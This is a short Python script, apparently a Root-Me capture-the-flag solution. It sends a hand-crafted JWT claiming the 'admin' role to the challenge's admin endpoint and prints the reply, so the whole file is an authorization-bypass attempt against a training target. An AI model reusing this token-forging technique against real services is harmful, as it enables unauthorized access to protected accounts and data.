import requests

url = "http://challenge01.root-me.org/web-serveur/ch59/admin"

token = "eyJhbGciOiJIUzUxMiIsInR5cCI6Im5vbmUifQ.eyJyb2xlIjoiYWRtaW4ifQ.blaJiefK5zzkaaDIJ1qHjTrajulwjKrDyMMN7Qv7_wGMrNnMRLXOKZHsWOjMsGVNsbqvYGpehYFMLyOySuzCHQ"

headers = {'Authorization': f'{token}'}

res = requests.post(url,headers=headers)

print(res,res.text)